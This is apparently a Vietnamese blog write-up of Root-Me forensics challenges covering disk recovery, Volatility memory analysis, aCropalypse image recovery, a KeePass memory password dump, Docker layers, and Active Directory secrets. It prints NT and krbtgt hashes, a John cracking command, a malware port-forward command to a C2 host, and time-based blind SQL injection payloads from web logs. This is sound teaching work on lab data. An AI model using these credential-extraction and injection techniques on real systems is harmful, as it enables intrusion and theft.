---
title: "[write-up] Root-Me: Forensics Part 1"
published: 2024-08-07
tags: [CTF, Forensics, RootMe]
category: Write-up
description: Phân tích các bài Forensics trong Root-Me, khai thác dữ liệu ẩn để truy vết và tìm flag.
draft: false
---


## Deleted file
![image](/assets/data/1.png)

Tiêu đề là phần gợi ý quan trọng của thử thách
Thử thách cho ta 1 file ch39.gz giải nén ta được 1 file usb.image

```
file usb.image
usb.image: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID "mkfs.fat", sectors/cluster 4, reserved sectors 4, root entries 512, sectors 63488 (volumes <=32 MB), Media descriptor 0xf8, sectors/FAT 64, sectors/track 62, heads 124, hidden sectors 2048, reserved 0x1, serial number 0xc7ecde5b, label: "USB", FAT (16 bit)

```
Đây là một ảnh đĩa của một thiết bị usb ta có thể sử dụng công cụ **ftK Imager** để phân tích nhưng để đơn giản ta sử dụng bộ công cụ **Sleuth Kit** 

Vì đây là 1 phân vùng nên ta sẽ sử dụng lệnh ```fls``` để liệt kê tất cả các file trong phân vùng

```
fls usb.image
r/r 3:  USB         (Volume Label Entry)
r/r * 5:        anonyme.png
v/v 1013699:    $MBR
v/v 1013700:    $FAT1
v/v 1013701:    $FAT2
V/V 1013702:    $OrphanFiles
```
Ta thấy 1 ảnh tên **anonyme.png** đã bị xóa tuy nhiên vẫn có thể lấy lại được

```
icat usb.image 5 > anonyme.png
```
Mở ra không có gì quan trọng, dùng ```exiftool``` để xem thông tin của ảnh ta sẽ thấy được thông tin của chủ sở hữu ở phần create

```
Flag: j****_turcot
```

## Capture this
![image](/assets/data/2.png)

Thử thách cho ta 1 file ch42.zip giải nén ra ta được 1 file ảnh ***Capture.png*** và 1 file ***Database.kdbx***: đây là 1 file datbase chưa mật khẩu của phần mềm quàn lí mật khẩu keepass, vẫn đề là ta cần mật khẩu gốc để mở nó

Mở ảnh Capture.png ta thấy 1 điều đáng ngờ là ảnh đã bị cắt đi một phần 
![image](/assets/data/3.png)

Nhìn kí ở phía bên phải ta thấy chữ **k** đoán là keepass và phần còn lại đã bị cắt đi, bây giờ ta cần khôi phục hình ảnh để biết thêm thông tin

Sau một lúc tìm hiểu thì mình biết ảnh này đã dính lỗ hổng ***CVE-2023-21036*** hay còn gọi là ***aCropalypse*** ứng dụng bị ảnh hưởng có thể kể đến như ***Snipping Tool***, phần bị cắt của ảnh không được xóa đi hết mà nó ghi đè thêm vào khiến việc khôi phục trở nên dễ dàng hơn

Ta có thể dùng kho lưu trữ này để khôi phục ảnh
```
https://github.com/frankthetank-music/Acropalypse-Multi-Tool/blob/main/acropalypse.py
```

Viết 1 đoạn mã python đơn giản để giải quyết bằng dòng lệnh thay vì cài đặt 

```python
import argparse
from acropalypse import Acropalypse

def main():
    parser = argparse.ArgumentParser(description="Acropalypse (CVE-2023-21036) PNG recovery tool")
    parser.add_argument("image_path", help="Path to the cropped PNG image")
    parser.add_argument("--width", type=int, required=True, help="Original image width before cropping")
    parser.add_argument("--height", type=int, required=True, help="Original image height before cropping")
    parser.add_argument("--alpha", action="store_true", help="Use RGBA (truecolor with alpha)")

    args = parser.parse_args()

    tool = Acropalypse()

    print(f"[+] Checking if '{args.image_path}' is vulnerable...")
    result = tool.detect_png(args.image_path)

    if result is True:
        print("[!] Image appears vulnerable. Proceeding to reconstruct...")
        tool.reconstruct_image(args.image_path, args.width, args.height, args.alpha)
        print("[+] Image reconstruction completed. Output written to system temp folder as 'restored.png'")
    else:
        print(f"[x] Not vulnerable or error: {result}")

if __name__ == "__main__":
    main()
```
Điều quan trọng nữa là chúng ta phải biết kích thước ảnh gốc ban đầu, thử thách này là 1 ảnh chụp màn hình laptop nên mình đoán width khoảng 1920 

```
acropalypse --width 1920 --height 2400 --alpha Capture.png
```

![image](/assets/data/4.png)

Vậy là ta đã có mật khẩu keepass, vào và lụm flag

## Command & Control - level 2

![image](/assets/data/5.png)

Giải nén ***ch2.tbz2*** ta được 1 file bộ nhớ ***ch2.dump*** ta sẽ dùng công cụ ***volatility*** để phân tích bộ nhớ này

```
volatility -f ch2.dmp imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/minhtuan/Documents/Cyber_Security/CTFs/RootMe/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100
```

Phiên bản ***Win7SP1x86_23418***

Trên Windows, bạn có thể tìm ra tên của máy trạm bằng cách tìm trong sổ đăng ký "HKLM\CurrentControlSet\Control\ComputerName" để tìm khóa "ActiveComputerName". Do đó, chúng tôi sẽ sử dụng tùy chọn printkey để trích xuất giá trị từ sổ đăng ký.
Tùy chọn prinkey sẽ tìm khóa này theo mặc định trong tất cả các hive của sổ đăng ký. Do đó, không cần phải chỉ định HKLM. Ngoài ra, chúng tôi không yêu cầu CurrentControlSet, về cơ bản chỉ là liên kết tượng trưng đến ControlSet cuối cùng hoạt động

```
volatility -f ch2.dmp --profile=Win7SP1x86_23418 printkey -K "ControlSet001\Control\ComputerName\ComputerName"
Volatility Foundation Volatility Framework 2.6.1
Legend: (S) = Stable   (V) = Volatile

----------------------------
Registry: \REGISTRY\MACHINE\SYSTEM
Key name: ComputerName (S)
Last updated: 2013-01-12 00:58:30 UTC+0000

Subkeys:

Values:
REG_SZ                        : (S) mnmsrvc
REG_SZ        ComputerName    : (S) WIN-ETSA91RKCFP
```
OK tên máy là ```WIN-ETSA91RKCFP```

## Command & Control - level 3

![image](/assets/data/18.png)

Dùng volatility để phân tích bộ nhớ ch2.dmp để tìm phần mềm độc hại

Dùng plugin **pstree** Để liệt kê tất cả các tiến trình theo quan hệ cha con

```
volatility -f ch2.dmp --profile=Win7SP1x86_23418 pstree
```

Ta thấy 1 tiến trình đáng ngờ, ```iexplorer.exe``` có một process con là ```cmd.exe```, đây là điểm đáng nghi vì internet explorer thường sẽ không có process con là cmd

```
0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
.0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
```

Dùng ```cmdline``` để xem đường dẫn của iexplore.exe
```
volatility -f ch2.dmp --profile=Win7SP1x86_23418 cmdline -p 2772
Volatility Foundation Volatility Framework 2.6.1
************************************************************************
iexplore.exe pid:   2772
Command line : "C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe"
```

Cái iexplorer.exe đáng lẽ ra nó phải nằm ở ```C:\Program Files\Internet Explorer\iexplore.exe```, nếu như không nằm ở đấy thì có thể khẳng định rằng nó là malware. Và đoạn ```C:\Users\John Doe\AppData\Roaming\Microsoft\Internet Explorer\Quick Launch\iexplore.exe``` chính là câu lệnh thực thi malware đó

## Command & Control - level 4

![image](/assets/data/23.png)

Dùng volatility để phân tích bộ nhớ ram và tìm ra địa chỉ ip của máy chú mà tin tặc nhắm tới


```
volatility -f ch2.dmp imageinfo
Volatility Foundation Volatility Framework 2.6.1
INFO    : volatility.debug    : Determining profile based on KDBG search...
          Suggested Profile(s) : Win7SP1x86_23418, Win7SP0x86, Win7SP1x86_24000, Win7SP1x86
                     AS Layer1 : IA32PagedMemoryPae (Kernel AS)
                     AS Layer2 : FileAddressSpace (/home/minhtuan/Documents/Cyber_Security/CTFs/RootMe/ch2.dmp)
                      PAE type : PAE
                           DTB : 0x185000L
                          KDBG : 0x82929be8L
          Number of Processors : 1
     Image Type (Service Pack) : 0
                KPCR for CPU 0 : 0x8292ac00L
             KUSER_SHARED_DATA : 0xffdf0000L
           Image date and time : 2013-01-12 16:59:18 UTC+0000
     Image local date and time : 2013-01-12 17:59:18 +0100
```

Từ câu phía trên mình đã xác định được cmd.exe với process là 1616 chính là process con của một process độc hại. Vậy nên mình sẽ bắt đầu tìm kiếm những command được dùng bởi process này .

```
. 0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
.. 0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
```

Dùng plugin ```consoles``` để trích xuất nội dung của các cửa sổ console (cmd.exe) đang chạy trong bộ nhớ của một hệ thống Windows

```
ConsoleProcess: conhost.exe Pid: 2168
Console: 0x1081c0 CommandHistorySize: 50
HistoryBufferCount: 3 HistoryBufferMax: 4
OriginalTitle: %SystemRoot%\system32\cmd.exe
Title: C:\Windows\system32\cmd.exe
AttachedProcess: cmd.exe Pid: 1616 Handle: 0x64
----
CommandHistory: 0x427a60 Application: tcprelay.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427890 Application: whoami.exe Flags:
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x0
----
CommandHistory: 0x427700 Application: cmd.exe Flags: Allocated
CommandCount: 0 LastAdded: -1 LastDisplayed: -1
FirstCommand: 0 CommandCountMax: 50
ProcessHandle: 0x64
----
Screen 0x416348 X:80 Y:300
Dump:
```

Oke và thấy có 1 phần mềm đáng nghi là ```tcprelay.exe```

```
 strings ch2.dmp | grep "tcprelay.exe"
  tcprelay.exe
  tcprelay.exe
  tcprelay.exe
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exe
\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exe
  tcprelay.exe
5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
01/12/2013  05:57 PM            22,078 tcprelay.exe
mp\TEMP23\tcprelay.exe
 Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
01/12/2013  05:57 PM            22,078 tcprelay.exe
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exe
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeN_
C:\Users\John Doe\AppData\Local\Temp\TEMP23\tcprelay.exeJ"
5C:\Users\JOHNDO~1\AppData\Local\Temp\TEMP23\tcprelay.exeg[j
tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443
```
Có thể thấy dòng ```tcprelay.exe 192.168.0.22 3389 yourcsecret.co.tv 443``` xuất hiện khá nhiều lần, tới đây thì mình cũng hiểu sơ sơ là tcprelay được dùng để thiết lập port forwarding, từ đó thực hiện mở một kết nối an toàn (HTTPS) tới máy chủ từ xa có ip là 192.168.0.22 và port là 3389 thông qua Remote Desktop Protocol (RDP)

```Flag: 192.168.0.22:3389```


## Command & Control - level 5

![image](/assets/data/12.png)

Như thường lệ ta sẽ dùng volatility để phân tích bộ nhớ ram


Dùng plugin hashdump để trích xuất các hash có trong bộ nhớ

```
volatility -f ch2.dmp --profile=Win7SP1x86_23418 hashdump
Volatility Foundation Volatility Framework 2.6.1
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
John Doe:1000:aad3b435b51404eeaad3b435b51404ee:b9f917853e3dbf6e6831ecce60725930:::
```

Sau đó dùng ***John*** để tấn công từ điển lấy mật khẩu

```
john --format=nt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

#passw0rd 
```




## Command & Control - level 6

![image](/assets/data/30.png)

Ở level trước ta đã xác định được tiền trình độc hại khi chạy plugin ```pstree```

```
0x87b6b030:iexplore.exe                            2772   2548      2     74 2013-01-12 16:40:34 UTC+0000
.0x89898030:cmd.exe                                1616   2772      2    101 2013-01-12 16:55:49 UTC+0000
```
Tiến trình iexplore.exe có ```pid``` 2772 là tiến trình độc hại khi nó sinh ra proc con ```cmd.exe```

Dùng plugin ```procdump``` để dump tiến trình này dạng ``.exe`` để phân tích

```
volatility -f ch2.dmp --profile=Win7SP1x86_23418 procdump --pid=2772 --dump-dir=.

Volatility Foundation Volatility Framework 2.6.1
Process(V) ImageBase  Name                 Result
---------- ---------- -------------------- ------
0x87b6b030 0x00400000 iexplore.exe         OK: executable.2772.exe
```
Để đơn giản thì ném lên https://www.virustotal.com/ để phân tích

![image](/assets/data/31.png)

Đây là một tiến trình độc hại, để xem tên máy chủ ```host.domain.tld``` chuyển sang phần ```Behavior``` 
![image](/assets/data/32.png)

```Flag: th1sis.l1k3aK3y.org```

## MasterKee
![image](/assets/data/6.png)

Ta được cung cấp 1 file là ***Masterkee.kdbx*** là file quản lí mật khẩu của phần mềm keepss và 1 file ***MasterKee.DMP*** là bộ nhớ của nó, Mục tiêu cuối cùng là phân tích bộ nhớ và tìm mật khẩu keepass

Sau 1 lúc phân tích thì ta nhanh chóng tìm được kết quả liên quan đến Keepass CVE

CVE này là ***CVE-2023-32784*** cho phép khôi phục mật khẩu Keepass từ bộ nhớ của máy ở phiên bản keepass 2.X(Có thể tìm hiểu để hiểu rõ cách thức hoạt động của nó)

Ta tìm được 1 kho lưu trữ khai thác CVE này
https://github.com/vdohney/keepass-password-dumper

```
keepass MasterKee.DMP
....
Password candidates (character positions):
Unknown characters are displayed as "●"
1.:     ●
2.:     e, 3, Ï, §, ', ñ, D, ­, \, #, y, k, 9, ;, H, B, q, a,
3.:     r,
4.:     e,
5.:     _,
6.:     I,
7.:     s,
8.:     _,
9.:     M,
10.:    y,
11.:    _,
12.:    V,
13.:    3,
14.:    r,
15.:    y,
16.:    _,
17.:    S,
18.:    3,
19.:    c,
20.:    r,
21.:    3,
22.:    t,
23.:    _,
24.:    P,
25.:    4,
26.:    s,
27.:    s,
28.:    w,
29.:    0,
30.:    r,
31.:    d,
32.:    2,
33.:    0,
34.:    2,
35.:    4,
36.:    !,
Combined: ●{e, 3, Ï, §, ', ñ, D, ­, \, #, y, k, 9, ;, H, B, q, a}re_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
```
Nó sẽ khôi phục được mật khẩu dựa vào bộ nhớ trừ kí tự đầu tiên nhưng ta có thể đoán được

```
Here_Is_My_V3ry_S3cr3t_P4ssw0rd2024!
```
Giờ thì mở keepass và lụm flag

## Oh My Grub

![image](/assets/data/7.png)

Giải nén ta được file ***root-disk001.vmdk***

```
file root-disk001.vmdk
root-disk001.vmdk: VMware4 disk image
```
File root-disk001.vmdk là một file ổ đĩa ảo của VMware — dùng để chứa dữ liệu ổ cứng của một máy ảo

Để đơn giản ta sẽ dùng bộ công cụ ***Sleuth Kit*** 

Liệt kê tất cả các phân vùng của ổ đĩa

```
mmls root-disk001.vmdk
DOS Partition Table
Offset Sector: 0
Units are in 512-byte sectors

      Slot      Start        End          Length       Description
000:  Meta      0000000000   0000000000   0000000001   Primary Table (#0)
001:  -------   0000000000   0000002047   0000002048   Unallocated
002:  000:000   0000002048   0015988735   0015986688   Linux (0x83)
003:  -------   0015988736   0015990783   0000002048   Unallocated
004:  Meta      0015990782   0016775167   0000784386   DOS Extended (0x05)
005:  Meta      0015990782   0015990782   0000000001   Extended Table (#1)
006:  001:000   0015990784   0016775167   0000784384   Linux Swap / Solaris x86 (0x82)
007:  -------   0016775168   0016777215   0000002048   Unallocated
```
Liệt kê các file của ô đĩa 2048 và tìm kiếm tệp nhạy cảm của ổ đĩa là ***.passwd***

```
 fls -o 2048 -r root-disk001.vmdk | grep ".passwd"

++ r/r 262505:  passwd
++ r/r 262212:  opasswd
++ r/r 262501:  chpasswd
++ r/r 262504:  passwd
++ r/l * 262492(realloc):       passwd.dpkg-new
+ r/r 269356:   passwd
+ r/r 262265:   passwd-
++++ r/r 455:   base-passwd.postinst
++++ r/r 775:   passwd.preinst
++++ r/r 237:   base-passwd.md5sums
++++ r/r 774:   passwd.conffiles
++++ r/r 766:   passwd.md5sums
++++ r/r 776:   passwd.postinst
++++ r/r 453:   base-passwd.preinst
++++ r/r 461:   base-passwd.list
++++ r/r 454:   base-passwd.postrm
++++ r/r 456:   base-passwd.templates
++++ r/r 778:   passwd.list
++++ r/r 132190:        base-passwd
++++ r/r 137462:        passwd
++ d/d 132314:  base-passwd
+++ r/r 132193: passwd.master
+++ r/r * 132193(realloc):      passwd.master.dpkg-new
+++ r/r * 137158:       passwd.master.dpkg-tmp
++ r/r * 133989:        gpasswd
++ r/r * 133990:        passwd
++ r/r 131167:  gpasswd
++ r/r 131168:  passwd
++ r/r 139881:  grub-mkpasswd-pbkdf2
++ r/r * 139881(realloc):       grub-mkpasswd-pbkdf2.dpkg-new
++ r/r * 132189:        update-passwd
++ r/r * 131133:        chpasswd
++ r/r * 131135:        chgpasswd
+ r/r 269358:   .passwd
+ r/r * 263164: .passwd~
```
Nó ở vị trí 269358

```
icat -o 2048 root-disk001.vmdk 269358
Bravo voici le flag :

F1aG-M3_PlEas3:)

Congratulation ! You may validate using this flag

F1aG-M3_PlEas3:)
```
Dùng ***icat*** để đọc tệp ta có flag

## Docker layers

![image](/assets/data/8.png)

Giải nén ta được file ta được rất nhiều các layer file

Ta mở lần lượt các file thì lấy 1 điều đáng ngờ

```
{"created":"2021-10-20T20:37:10.282265118Z","created_by":"/bin/sh -c echo -n 
$(curl -s https://pastebin.com/raw/P9Nkw866) | 
openssl enc -aes-256-cbc -iter 10 -pass pass:$(cat /pass.txt) -out flag.enc"}
```

Nó dùng để mã hóa ***openssl*** từ pastebin sau đó đưa vào ***flag.enc***, bây giờ ta phải tìm được file flag.enc và pass.txt để tiến hành giải mã

```
tar -xvf 3309d6da2bd696689a815f55f18db3f173bc9b9a180e5616faf4927436cf199d.tar
flag.enc
```

```
tar -xvf 316bbb8c58be42c73eefeb8fc0fdc6abb99bf3d5686dd5145fc7bb2f32790229.tar
pass.txt
```
Ok giờ đã có 2 tệp này chỉ cần dùng openssl ngược lại để giải mã ta sẽ được flag

```
openssl enc -aes-256-cbc -d -iter 10 -pass file:pass.txt -in flag.enc

Well_D0ne_D0ckER_L@y3rs_Inspect0R
```

## Windows - LDAP User KerbeRoastable

![image](/assets/data/9.png)

Ta được cung cấp 1 file ch31.json và sử dụng thông tin trong bản dump này để tìm người dùng Kerberoastable

Đung công cụ tên ***ldap2json*** để phân tích bản dump này
https://github.com/p0dalirius/ldap2json

```
 python3 analysis.py -f ../../ch31.json
[>] Loading ../../ch31.json ... done.
[]> help
 - searchbase                          Sets the LDAP search base.
 - object_by_property_name             Search for an object containing a property by name in LDAP.
 - object_by_property_value            Search for an object containing a property by value in LDAP.
 - object_by_dn                        Search for an object by its distinguishedName in LDAP.
 - search_for_kerberoastable_users     Search for users accounts linked to at least one service in LDAP.
 - search_for_asreproastable_users     Search for users with DONT_REQ_PREAUTH parameter set to True in LDAP.
 - help                                Displays this help message.
 - exit                                Exits the script.
[]>
```

Dùng ```search_for_kerberoastable_users``` để liệt kê các user kerberoastable

```
python3 analysis.py -f ../../ch31.json
[>] Loading ../../ch31.json ... done.
[]> help
 - searchbase                          Sets the LDAP search base.
 - object_by_property_name             Search for an object containing a property by name in LDAP.
 - object_by_property_value            Search for an object containing a property by value in LDAP.
 - object_by_dn                        Search for an object by its distinguishedName in LDAP.
 - search_for_kerberoastable_users     Search for users accounts linked to at least one service in LDAP.
 - search_for_asreproastable_users     Search for users with DONT_REQ_PREAUTH parameter set to True in LDAP.
 - help                                Displays this help message.
 - exit                                Exits the script.
[]> search_for_kerberoastable_users
[CN=Alexandria,CN=Users,DC=ROOTME,DC=local] => servicePrincipalName
 - ['HTTP/SRV-RDS.rootme.local']
[]>
```

Dùng ```object_by_dn``` Để xem toàn bộ thông tin của ```CN=Alexandria,CN=Users,DC=ROOTME,DC=local``` ta sẽ có được email

```
object_by_dn CN=Alexandria,CN=Users,DC=ROOTME,DC=local
.
.
.
"name": "Alexandria",
    "objectGUID": "{aead746c-2a21-42f8-89bf-2080ec5b2a9f}",
    "userAccountControl": 66048,
    "badPwdCount": 0,
    "codePage": 0,
    "countryCode": 0,
    "badPasswordTime": "1601-01-01 00:00:00",
    "lastLogoff": "1601-01-01 00:00:00",
    "lastLogon": "1601-01-01 00:00:00",
    "pwdLastSet": "2022-08-29 22:26:06",
    "primaryGroupID": 513,
    "objectSid": "S-1-5-21-1356747155-1897123353-4258384033-2092",
    "accountExpires": "9999-12-31 23:59:59",
    "logonCount": 0,
    "sAMAccountName": "a.newton",
    "sAMAccountType": 805306368,
    "servicePrincipalName": [
        "HTTP/SRV-RDS.rootme.local"
    ],
    "objectCategory": "CN=Person,CN=Schema,CN=Configuration,DC=ROOTME,DC=local",
    "dSCorePropagationData": [
        "1601-01-01 00:00:00"
    ],
    "mail": "alexandria.newton@rootme.local"
```
## Windows - NTDS Extraction de secrets
![image](/assets/data/10.png)

Ta sẽ dùng 1 công cụ tên là ***secretsdump.py***: Đây là một script trong công cụ Impacket, dùng để trích xuất các hash mật khẩu từ hệ thống Windows, đặc biệt là từ các Domain Controller (DC)

Kết hợp với grep để tìm accout ***krbtgt***

```
secretsdump.py -system "registry/SYSTEM" -ntds "Active Directory/ntds.dit" LOCAL | grep "krbtgt"

/home/minhtuan/.local/lib/python3.13/site-packages/impacket/version.py:10: UserWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html. The pkg_resources package is slated for removal as early as 2025-11-30. Refrain from using this package or pin to Setuptools<81.
  import pkg_resources
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:1a3cf03faaf1b5a34e4d538e2206f8f0:::
krbtgt:aes256-cts-hmac-sha1-96:85c422e6d4f4e340b445c6a3f16d8d7b25bfdf290d956134bc0d5b6ab272b475
krbtgt:aes128-cts-hmac-sha1-96:fd526233205e13c0b8225087e848a101
krbtgt:des-cbc-md5:4f1f767686e52019
```

## Logs analysis - web attack

![image](/assets/data/11.png)
Bài này lúc đầu mình tìm kiếm sự khác nhau giữa các request, xong thấy trùng nhau giữa từng cụm 4 request nhiều và khác nhau giữa các cụm cũng nhiều nên mình dịch base64 ra thử. Lấy vd 8 lines đầu:


```
192.168.1.23 - - [18/Jun/2015:12:12:54 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),1,1),substring(bin(ascii(substring(password,1,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:00 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),3,1),substring(bin(ascii(substring(password,1,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:00 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),5,1),substring(bin(ascii(substring(password,1,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:06 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,1,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1) HTTP/1.1" 200 832 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:10 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),1,1),substring(bin(ascii(substring(password,2,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:16 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),3,1),substring(bin(ascii(substring(password,2,1))),4,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:20 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),5,1),substring(bin(ascii(substring(password,2,1))),6,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
192.168.1.23 - - [18/Jun/2015:12:13:22 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),7,1)),char(48),char(49)) when 1 then sleep(2) when 2 then sleep(4)  end) from membres where id=1) HTTP/1.1" 200 832 "-" "-"
```
Đây là log traffic tới của apache server. Lấy dòng đầu làm ví dụ, ta phân tích được:

```
ASC,
(select
  (case
    field(
      concat(
        substring(bin(ascii(substring(password,1,1))),1,1),
        substring(bin(ascii(substring(password,1,1))),2,1)
      ),
      concat(char(48),char(48)),
      concat(char(48),char(49)),
      concat(char(49),char(48)),
      concat(char(49),char(49))
    )
    when 1 then TRUE
    when 2 then sleep(2)
    when 3 then sleep(4)
    when 4 then sleep(6)
  end
  )
from membres where id=1
)
```
Đây là log của một cuộc tấn công blind sql injection, attacker thực hiện nhiều câu truy vấn cách nhau bằng dấu phẩy. ASC để hiện danh sách thành viên theo thứ tự lớn đến nhỏ, không liên quan đế câu truy vấn sau. Từ đoạn select, code thực hiện việc lấy nội dung ô password trong bảng mebres có id=1; với mỗi kí tự trong ô password được đổi qua integer, rồi qua chuỗi binary. Mỗi request sẽ lần lượt lấy mỗi 2 bits kí tự của chuỗi binary và tìm vị trí của nó trong field – field(xx,’00’,’01’,’10’,’11’), case field=1 thì trả về true, nếu field=2 thì sleep(2), field=3 thì sleep(3), field=4 thì sleep(6).

Mã ASCII tốn 8 bits, nhưng thông thường chỉ cần 7 bits nên sẽ tốn 4 request cho mỗi kí tự 3×2 + 1, request thứ tư của mỗi kí tự ngắn hơn 3 cái còn lại. Giải sử:

>Attacker chỉ gửi request khi nhận response

>Sau khi nhận được response từ request trước, attacker ngay lập tức gửi ngay request tiếp theo

Như thế thì khoảng thời gian giữa 2 lần request tới trên log chính là khoảng thời gian giữa request và response của request đó. Để tìm flag, lúc này sau khi hiểu câu truy vấn, ta không cần đổi base64 chi nữa, chỉ việc lấy gian thời của mỗi line trong log đề cho trừ nhau, nếu request thuộc 6 bits đầu thì so sánh với 2s or 4s or 6s, nếu là bit thứ 7 thì so sánh với 2s or 4s; dùng một biến phụ để nối các chuỗi ’00’, ’01’, ’10’, ’11’ lại thành chuỗi nhị phân, sau đó đổi qua hệ 10 rồi sang ASCII. Quan trọng nằm ở khoảng thời gian 0s, hai request cách nhau 0 giây có thể là:

>True nếu 2 bits là ’00’, request query bit thuộc 6 bits đầu

>Select NULL nếu không nằm trong field/ case

>Error, vd: request hỏi bit thứ 7 nhưng chỉ có 6 bits, hay truy vấn kí tự thứ 21 nhưng chỉ có 20 kí tự

```
192.168.1.23 - - [18/Jun/2015:12:13:10 +0200] "GET /admin/?action=membres&order=ASC,(select (case field(concat(substring(bin(ascii(substring(password,2,1))),1,1),substring(bin(ascii(substring(password,2,1))),2,1)),concat(char(48),char(48)),concat(char(48),char(49)),concat(char(49),char(48)),concat(char(49),char(49)))when 1 then TRUE when 2 then sleep(2) when 3 then sleep(4) when 4 then sleep(6) end) from membres where id=1) HTTP/1.1" 200 1005 "-" "-"
